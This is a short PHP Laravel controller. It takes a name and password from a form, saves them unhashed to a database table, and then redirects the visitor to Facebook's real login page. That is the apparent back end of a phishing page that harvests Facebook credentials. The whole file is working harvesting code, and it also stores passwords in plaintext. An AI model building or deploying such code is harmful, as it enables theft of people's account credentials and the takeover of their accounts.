<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
class ControllerController
{

public function start(){
		
 return view('st');
 }
 public function add(Request $request){

 	$name=$request->input('name');
 	$password=$request->input('pass');
$data=array('name'=>$name,'pass'=>$password);
DB::table('DD')->insert($data);
 return redirect()->to('https://www.facebook.com/login');
 }
}
